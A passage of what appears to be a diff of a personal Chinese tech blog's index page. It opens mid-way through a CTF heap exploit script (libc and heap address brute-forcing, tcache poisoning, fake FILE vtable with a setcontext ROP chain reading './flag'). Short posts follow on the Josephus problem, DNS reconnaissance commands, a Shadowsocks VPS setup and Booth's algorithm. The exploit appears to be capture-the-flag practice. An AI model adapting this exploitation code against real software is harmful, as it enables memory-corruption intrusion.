class="number">0x70</span>))</span><br><span class="line">S(str(<span class="number">0x70</span>))</span><br><span class="line">idx = p.recvuntil(<span class="string">'\n'</span>)[len(<span class="string">"Malloc done, idx is "</span>):<span class="number">-2</span>]</span><br><span class="line">arr_idx = int(idx.decode())</span><br><span class="line"></span><br><span class="line">l = <span class="number">18</span></span><br><span class="line"><span class="keyword">if</span> arr_idx &lt; l:</span><br><span class="line">    l = arr_idx</span><br><span class="line"></span><br><span class="line">libc = <span class="number">0x7f0000000000</span></span><br><span class="line">b = <span class="number">0x1000000000</span></span><br><span class="line"><span class="keyword">while</span> b &gt;= <span class="number">0x1000</span>:</span><br><span class="line">    E(str(arr_idx), p64(<span class="number">0</span>)*l)</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="number">16</span>:</span><br><span class="line">        tmp = libc+i*b</span><br><span class="line">        L(str(b), tmp)</span><br><span class="line">        ss = p.recvuntil(<span class="string">'\n'</span>).decode()</span><br><span class="line">        <span class="keyword">if</span> ss == <span class="string">"Map failed.\n"</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    libc += i*b</span><br><span class="line">    b = int(b/<span class="number">0x10</span>)</span><br><span class="line">print(<span class="string">'libc'</span>, hex(libc))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">heap = addr-addr % <span class="number">0x1000000</span>+<span class="number">0x1000000</span></span><br><span class="line">b = <span class="number">0x1000000</span></span><br><span class="line"><span class="comment"># print(hex(heap))</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"><span class="keyword">while</span> b &gt;= <span class="number">0x1000</span>:</span><br><span class="line">    E(str(arr_idx), p64(<span class="number">0</span>)*l)</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="number">16</span>:</span><br><span class="line">        tmp = heap+i*b</span><br><span class="line">        L(str(b), tmp)</span><br><span class="line">        ss = p.recvuntil(<span class="string">'\n'</span>).decode()</span><br><span class="line">        <span class="keyword">if</span> ss == <span class="string">"Map failed.\n"</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    heap += i*b</span><br><span class="line">    b = int(b/<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">'elf'</span>, hex(addr))</span><br><span class="line">print(<span class="string">'libc'</span>, hex(libc))</span><br><span class="line">print(<span class="string">'heap'</span>, hex(heap))</span><br><span class="line">print(<span class="string">'_IO_list_all'</span>, hex(libc+lelf.sym[<span class="string">'_IO_list_all'</span>]))</span><br><span class="line"></span><br><span class="line">E(str(arr_idx), p64(<span class="number">0</span>)*l)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">S(str(<span class="number">0x10</span>))</span><br><span class="line">idx = p.recvuntil(<span class="string">'\n'</span>)[len(<span class="string">"Malloc done, idx is "</span>):<span class="number">-2</span>]</span><br><span class="line">idx = int(idx.decode())</span><br><span class="line">payload = <span class="number">0x10</span>*<span class="string">b'a'</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(libc + <span class="number">0x3ec660</span>)</span><br><span class="line">E(str(idx), payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">    S(str(<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">size_addr = addr+<span class="number">0x2028C0</span></span><br><span class="line">print(<span class="string">'size_addr'</span>, hex(size_addr))</span><br><span class="line">S(str(<span class="number">0x10</span>))</span><br><span class="line">idx = p.recvuntil(<span class="string">'\n'</span>)[len(<span class="string">"Malloc done, idx is "</span>):<span class="number">-2</span>]</span><br><span class="line">idx = int(idx.decode())</span><br><span class="line">payload = <span class="number">0x10</span>*<span class="string">b'a'</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(size_addr)</span><br><span class="line">E(str(idx), payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">S(str(<span class="number">0x40</span>))</span><br><span class="line">idx = p.recvuntil(<span class="string">'\n'</span>)[len(<span class="string">"Malloc done, idx is "</span>):<span class="number">-2</span>]</span><br><span class="line">fake_idx = int(idx.decode())</span><br><span class="line">S(str(<span class="number">0x40</span>))</span><br><span class="line">idx = p.recvuntil(<span class="string">'\n'</span>)[len(<span class="string">"Malloc done, idx is "</span>):<span class="number">-2</span>]</span><br><span class="line">size_idx = int(idx.decode())</span><br><span class="line">print(<span class="string">'size_idx'</span>, size_idx)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    S(str(<span class="number">0x60</span>))</span><br><span class="line">idx = p.recvuntil(<span class="string">'\n'</span>)[len(<span class="string">"Malloc done, idx is "</span>):<span class="number">-2</span>]</span><br><span class="line">list_idx = int(idx.decode())</span><br><span class="line">print(<span class="string">'list_idx'</span>, list_idx)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0x400</span>)*<span class="number">20</span></span><br><span class="line">E(str(size_idx), payload)</span><br><span class="line">print(<span class="string">'size_addr'</span>, hex(size_addr))</span><br><span class="line"><span class="comment">#   0x1f620</span></span><br><span class="line">setcontext = libc+lelf.sym[<span class="string">'setcontext'</span>]+<span class="number">53</span></span><br><span class="line"></span><br><span class="line">fake_addr = heap+<span class="number">0xef0</span>+<span class="number">0x10</span></span><br><span class="line">payload = p64(fake_addr)</span><br><span class="line">E(str(list_idx), payload)</span><br><span class="line"></span><br><span class="line">vtable = libc + <span class="number">0x3e8360</span></span><br><span class="line"><span class="comment"># sys = libc+lelf.sym['system']</span></span><br><span class="line">syscall = libc+lelf.sym[<span class="string">'system'</span>]</span><br><span class="line">o = libc+lelf.sym[<span class="string">'open'</span>]</span><br><span class="line">r = libc+lelf.sym[<span class="string">'read'</span>]</span><br><span class="line">w = libc+lelf.sym[<span class="string">'write'</span>]</span><br><span class="line"></span><br><span class="line">rdi = libc+<span class="number">0x2155f</span></span><br><span class="line">rsi = libc+<span class="number">0x23e8a</span></span><br><span class="line">rdx = libc+<span class="number">0x1b96</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">'vtable'</span>, hex(vtable))</span><br><span class="line">payload = <span class="string">b'\x00'</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0</span>)+p64(fake_addr+<span class="number">0x100</span>)+<span class="string">b'\x00'</span>*(<span class="number">0xc0</span><span class="number">-0x40</span>) + \</span><br><span class="line">    (<span class="number">0xd8</span><span class="number">-0xc0</span>)*<span class="string">b'\x00'</span>+p64(vtable<span class="number">-0x8</span>) + \</span><br><span class="line">    p64(<span class="number">0</span>) + p64(setcontext)+<span class="string">b'\x00'</span>*(<span class="number">0x100</span><span class="number">-0xf0</span>)</span><br><span class="line"></span><br><span class="line">payload += <span class="number">0xa0</span>*<span class="string">b'\x00'</span>+p64(fake_addr+<span class="number">0x200</span>)+p64(rdi) + \</span><br><span class="line">    <span class="string">b'./flag\0'</span>+<span class="string">b'\x00'</span>*(<span class="number">0x100</span><span class="number">-0xb0</span>-len(<span class="string">b'./flag\0'</span>))</span><br><span class="line"></span><br><span class="line">buf = fake_addr+<span class="number">0x1b0</span>+len(<span class="string">'./flag\0'</span>)</span><br><span class="line">payload += p64(fake_addr+<span class="number">0x1b0</span>)+p64(rsi)+p64(<span class="number">0</span>)+p64(o)</span><br><span class="line">payload += p64(rdi)+p64(<span class="number">3</span>)+p64(rsi)+p64(buf)+p64(rdx)+p64(<span class="number">0x20</span>)+p64(r)</span><br><span class="line">payload += p64(rdi)+p64(<span class="number">1</span>)+p64(rsi)+p64(buf)+p64(rdx)+p64(<span class="number">0x20</span>)+p64(w)</span><br><span class="line"></span><br><span class="line">E(str(fake_idx), payload)</span><br><span class="line"></span><br><span class="line">print(hex(arr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/08/joseph-ping/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="kaneiki wang">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xkaneiki's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2020/02/08/joseph-ping/" class="post-title-link" itemprop="url">约瑟夫环</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2020-02-08 10:02:44" itemprop="dateCreated datePublished" datetime="2020-02-08T10:02:44+08:00">2020-02-08</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Modified: 2020-10-22 00:37:41" itemprop="dateModified" datetime="2020-10-22T00:37:41+08:00">2020-10-22</time>
-              
-            
-          </span>
-
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="Joseph-Ping-约瑟夫环"><a href="#Joseph-Ping-约瑟夫环" class="headerlink" title="Joseph Ping 约瑟夫环"></a>Joseph Ping 约瑟夫环</h1><h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>N个人坐成一个圆环（编号为1 - N），从第1个人开始报数，数到K的人出列，后面的人重新从1开始报数。问最后剩下的人的编号。</p>
-<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol>
-<li><del>直接模拟,复杂度O(n^2)</del></li>
-<li>找规律</li>
-</ol>
-<h2 id="找规律"><a href="#找规律" class="headerlink" title="找规律"></a>找规律</h2><ol>
-<li>考虑N个人，最后一个出列的人的编号是p（从1开始编号）<!-- <img src="/2020/02/08/joseph-ping/2.jpeg" title="[2]"> -->
-<img src="/2020/02/08/joseph-ping/2.jpeg" alt></li>
-<li>当有N+1个人时，第一个出列的人的编号是(K-1)%(N+1)+1<!-- <img src="/2020/02/08/joseph-ping/1.jpeg" title="[1]"> -->
-<img src="/2020/02/08/joseph-ping/1.jpeg" alt></li>
-<li>从第(K-1+1)%(N+1)+1个人开始重新编号（红色的部分）<!-- <img src="/2020/02/08/joseph-ping/3.jpeg" title="[3]"> -->
-<img src="/2020/02/08/joseph-ping/3.jpeg" alt></li>
-<li>红色的编号和黑色的编号具有这样的关系：令红色编号i对应的黑色编号为j，则j=(i-1+K)%(N+1)+1</li>
-<li>当第一个人走了以后，经过重新的编排（红色的编号）剩下的N个人满足1.的情况，根据4.的对应关系，则N+1个人时最后出列的人的编号是(p-1+K)%(N+1)+1</li>
-<li>时间复杂度为O(n)</li>
-</ol>
-<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,k;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_1</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">int</span> k)</span><span class="comment">//递归</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">1</span>)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> (k+find_1(n<span class="number">-1</span>,k))%n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_2</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">int</span> k)</span><span class="comment">//非递归</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> cn=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> pos=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(cn&lt;n)</span><br><span class="line">    &#123;</span><br><span class="line">        cn++;</span><br><span class="line">        pos=(pos+k)%cn;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> pos;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n&gt;&gt;k;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;find_1(n,k)+<span class="number">1</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;find_2(n,k)+<span class="number">1</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/27/dns-collect/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="kaneiki wang">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xkaneiki's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2020/01/27/dns-collect/" class="post-title-link" itemprop="url">DNS收集</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2020-01-27 23:59:39" itemprop="dateCreated datePublished" datetime="2020-01-27T23:59:39+08:00">2020-01-27</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Modified: 2020-10-21 00:51:34" itemprop="dateModified" datetime="2020-10-21T00:51:34+08:00">2020-10-21</time>
-              
-            
-          </span>
-
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="DNS收集"><a href="#DNS收集" class="headerlink" title="DNS收集"></a>DNS收集</h1><h2 id="DNS记录"><a href="#DNS记录" class="headerlink" title="DNS记录"></a>DNS记录</h2><ol>
-<li><strong><em>A记录</em></strong>，正向解析，域名toIP</li>
-<li><strong><em>PTR记录</em></strong>，反向解析，IPto域名</li>
-<li><strong><em>CNME记录</em></strong>，别名</li>
-<li><strong><em>MX记录</em></strong>，mail.xxx.com，指向一个邮件服务器</li>
-<li><strong><em>NS服务器</em></strong>，dns.xxx.com，指向域名有哪个dns服务器进行查询</li>
-<li><strong><em>TXT记录</em></strong>,主机域名的查询</li>
-</ol>
-<h2 id="DNS查询方式"><a href="#DNS查询方式" class="headerlink" title="DNS查询方式"></a>DNS查询方式</h2><ol>
-<li>递归查询</li>
-<li>迭代查询&lt;-&lt;-&lt;-</li>
-</ol>
-<h2 id="常用的IP命令"><a href="#常用的IP命令" class="headerlink" title="常用的IP命令"></a>常用的IP命令</h2><ol>
-<li><p>ping</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 192.168.1.1</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>nslookup</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup www.baidu.com</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>dig</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dig @&lt;DNS地址&gt; any/192.168.1.1 #显示所有域名的记录</span><br><span class="line">	</span><br><span class="line">dig -x www.baidu.com#反向查询,通过IP查域名</span><br><span class="line"></span><br><span class="line">dig txt chaos VERSION.BIND &lt;dns服务器@ns3.dnsv4.com&gt;#查询dns服务器的bind的版本信息</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>DNS配置文件地址：/etc/resolv.conf</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/resolv.conf#显示dns配置信息</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>whois</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whois www.baidu.com #查询网站的域名注册信息和备案信息</span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-<h2 id="查询域名注册和备案信息的网站"><a href="#查询域名注册和备案信息的网站" class="headerlink" title="查询域名注册和备案信息的网站"></a>查询域名注册和备案信息的网站</h2><ol>
-<li><a href="https://www.whois.aliyun.com/" target="_blank" rel="noopener">阿里云</a></li>
-<li><a href="https://www.tianyancha.com/" target="_blank" rel="noopener">天眼查</a></li>
-<li><a href="https://icp.chinaz.com" target="_blank" rel="noopener">ChinaZ</a></li>
-</ol>
-<h2 id="使用Maltego-CE收集子域名信息"><a href="#使用Maltego-CE收集子域名信息" class="headerlink" title="使用Maltego CE收集子域名信息"></a>使用Maltego CE收集子域名信息</h2><ol>
-<li>注册一个账号（需要用翻墙）[]</li>
-<li>打开kali的matlego选择matlego CE（free）</li>
-<li>安装PATERVA CTAS CE就可以使用了</li>
-</ol>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/26/vps-build/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="kaneiki wang">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xkaneiki's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2020/01/26/vps-build/" class="post-title-link" itemprop="url">VPS服务器配置</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2020-01-26 04:48:32 / Modified: 15:45:16" itemprop="dateCreated datePublished" datetime="2020-01-26T04:48:32+08:00">2020-01-26</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="去搬瓦工买一台服务器"><a href="#去搬瓦工买一台服务器" class="headerlink" title="去搬瓦工买一台服务器"></a>去搬瓦工买一台服务器</h1><ul>
-<li><a href="https://bwh88.net/aff.php?aff=47237" target="_blank" rel="noopener">搬瓦工地址</a></li>
-<li>安装centos系统<h1 id="用ssh远程登陆服务器"><a href="#用ssh远程登陆服务器" class="headerlink" title="用ssh远程登陆服务器"></a>用ssh远程登陆服务器</h1></li>
-<li>任意的ssh工具即可</li>
-<li>在搬瓦工页面找到服务器地址和ssh端口号<img src="/2020/01/26/vps-build/01/26/vps-build/example.png" title="[example]">
-</li>
-</ul>
-<h1 id="配置服务器"><a href="#配置服务器" class="headerlink" title="配置服务器"></a>配置服务器</h1><ol>
-<li><p>输入命令</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget –no-check-certificate  https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks.sh</span><br><span class="line"></span><br><span class="line">chmod +x shadowsocks.sh</span><br><span class="line"></span><br><span class="line">./shadowsocks.sh 2&gt;&amp;1 | tee shadowsocks.log</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>配置密码和端口号</p>
-</li>
-<li>选择加密方式为aes-256-cfb</li>
-</ol>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/28/Booth算法/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="kaneiki wang">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xkaneiki's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/08/28/Booth算法/" class="post-title-link" itemprop="url">Booth算法</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2019-08-28 00:43:38" itemprop="dateCreated datePublished" datetime="2019-08-28T00:43:38+08:00">2019-08-28</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Modified: 2020-10-22 00:35:26" itemprop="dateModified" datetime="2020-10-22T00:35:26+08:00">2020-10-22</time>
-              
-            
-          </span>
-
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="Booth-算法"><a href="#Booth-算法" class="headerlink" title="Booth 算法"></a>Booth 算法</h1><p> <strong><em>用于补码一位乘法</em></strong></p>
-<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><ul>
-<li>这是一种有符号数的乘法，采用相加和相剪的操作计算补码的数据乘积，考虑$x*y$</li>
-<li>设$[x]_补=x_sx_1x_2x_3…x_n,[y]_补=y_sy_1y_2y_3…y_n$</li>
-<li>运算规则<ol>
-<li>符号位参与运算切都以补码的形式表示</li>
-<li>被乘数一般取双符号位参与运算，部分积取双符号位，初值为0，乘数采取单符号位</li>
-<li>乘数末尾附加$y_{n+1}$，初值为0</li>
-<li>根据$(y_n,y_{n+1})$确定操作</li>
-<li>移位按照补码右移规则进行（算数右移）</li>
-<li>按照上述步骤进行n+1步，第n+1步不进行移位</li>
-</ol>
-</li>
-</ul>
-<h2 id="算法的原理"><a href="#算法的原理" class="headerlink" title="算法的原理"></a>算法的原理</h2><ul>
-<li>基本思路:考虑一个一个数和一个连续的1的情况，如<ul>
-<li>$M*(0011100)$</li>
-<li>$=M*(2^4+2^3+2^2)$</li>
-<li>$=M*(2^5-2^2)$</li>
-</ul>
-</li>
-<li>从而<ul>
-<li>10表示连续1的开始，对应$M*2^5$</li>
-<li>01表示连续1的结束，对应$-M*2^2$</li>
-</ul>
-</li>
-<li>于是有移位的规则</li>
-</ul>
-<div class="table-container">
-<table>
-<thead>
-<tr>
-<th>$y_n$</th>
-<th style="text-align:left">$y_{n+1}$</th>
-<th style="text-align:left">operations</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>0</td>
-<td style="text-align:left">0</td>
-<td style="text-align:left">部分积右移一位</td>
-</tr>
-<tr>
-<td>0</td>
-<td style="text-align:left">1</td>
-<td style="text-align:left">部分积$+[-x]_补$,部分积右移一位</td>
-</tr>
-<tr>
-<td>1</td>
-<td style="text-align:left">0</td>
-<td style="text-align:left">部分积$+[x]_补$,部分积右移一位</td>
-</tr>
-<tr>
-<td>1</td>
-<td style="text-align:left">1</td>
-<td style="text-align:left">部分积右移一位</td>
-</tr>
-</tbody>
-</table>
-</div>
-<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p><img src="/2019/08/28/Booth算法/example.jpg" alt="实例"><br><!-- <img src="/2019/08/28/Booth算法/example.jpg" title="[example]"> —&gt;</p>
---></p>
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/11/ros读取图像/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="kaneiki wang">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xkaneiki's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/07/11/ros读取图像/" class="post-title-link" itemprop="url">ROS+OpenCV读取图像</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2019-07-11 00:34:48" itemprop="dateCreated datePublished" datetime="2019-07-11T00:34:48+08:00">2019-07-11</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
